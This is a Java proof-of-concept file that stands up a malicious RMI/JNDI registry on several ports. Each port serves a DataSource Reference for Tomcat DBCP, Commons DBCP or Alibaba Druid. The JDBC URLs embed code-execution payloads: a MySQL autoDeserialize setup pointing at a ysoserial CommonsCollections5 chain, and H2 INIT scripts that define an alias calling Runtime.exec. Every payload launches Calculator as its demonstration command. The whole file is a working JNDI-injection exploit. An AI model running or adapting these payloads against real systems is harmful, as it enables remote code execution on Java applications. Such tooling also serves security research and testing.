package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Whoopsunix
 */
public class LocalJDBCServer {
    public static void main(String args[]) throws Exception {
        tomcatDBCP2();
        tomcatDBCP();
        commonsDBCP2();
        commonsDBCP();
        tomcatH2DBCP2();
        alibabaDruid();

        System.out.println("server is running");
    }

    public static void tomcatDBCP2() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.jdbc.Driver"));
        ref.add(new StringRefAddr("url", "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app"));
        ref.add(new StringRefAddr("initialSize", "1"));

//        if (props.getProperty("sql") != null) {
//            ref.add(new StringRefAddr("connectionInitSqls", props.getProperty("sql")));
//        }

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("tomcatDBCP2", referenceWrapper);
    }

    public static void tomcatDBCP() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1098);
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.jdbc.Driver"));
        ref.add(new StringRefAddr("url", "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app"));
        ref.add(new StringRefAddr("initialSize", "1"));

//        if (props.getProperty("sql") != null) {
//            ref.add(new StringRefAddr("connectionInitSqls", props.getProperty("sql")));
//        }

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("tomcatDBCP", referenceWrapper);
    }

    public static void commonsDBCP2() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1097);
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.commons.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.jdbc.Driver"));
        ref.add(new StringRefAddr("url", "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app"));
        ref.add(new StringRefAddr("initialSize", "1"));

//        if (props.getProperty("sql") != null) {
//            ref.add(new StringRefAddr("connectionInitSqls", props.getProperty("sql")));
//        }

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("commonsDBCP2", referenceWrapper);
    }

    public static void commonsDBCP() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1096);
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.commons.dbcp.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.jdbc.Driver"));
        ref.add(new StringRefAddr("url", "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app"));
        ref.add(new StringRefAddr("initialSize", "1"));

//        if (props.getProperty("sql") != null) {
//            ref.add(new StringRefAddr("connectionInitSqls", props.getProperty("sql")));
//        }

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("commonsDBCP", referenceWrapper);
    }

    public static void tomcatH2DBCP2() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1095);
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('open -a calculator.app')\\;"));
        ref.add(new StringRefAddr("initialSize", "1"));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("tomcatH2DBCP2", referenceWrapper);
    }

    // https://xz.aliyun.com/t/10656
    public static void alibabaDruid() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1094);
        Reference ref = new Reference("javax.sql.DataSource", "com.alibaba.druid.pool.DruidDataSourceFactory", null);

        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('open -a calculator.app')\\;"));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        ref.add(new StringRefAddr("init", "true"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("alibabaDruid", referenceWrapper);
    }


}
